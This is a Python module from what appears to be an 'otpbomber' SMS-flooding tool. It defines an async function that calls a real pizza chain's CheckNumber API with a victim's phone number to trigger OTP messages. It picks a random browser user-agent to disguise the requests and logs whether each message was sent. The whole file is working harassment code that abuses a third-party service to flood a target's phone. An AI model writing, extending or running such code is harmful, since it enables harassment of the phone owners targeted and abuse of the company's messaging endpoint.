from otpbomber.core import *
from otpbomber.localuseragent import *

async def broadway(phone, client, out):
    name = "broadway"
    domain = "broadway"
    frequent_rate_limit = False

    headers = {
        'user-agent': random.choice(ua["browsers"]["chrome"]),
    }
    params = {
    'method': 'CheckNumber',
    'Number': f'0{phone[-10:]}',
    }

    response = await client.get('https://services.broadwaypizza.com.pk/BroadwayAPI.aspx', params=params, headers=headers)

    try:

        data = response.json()
        if data.get('responseType') == "1":
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": True, "error": False})
        else:
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True})

    except Exception as e:
        print(f"Error: {e}")
        out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True})
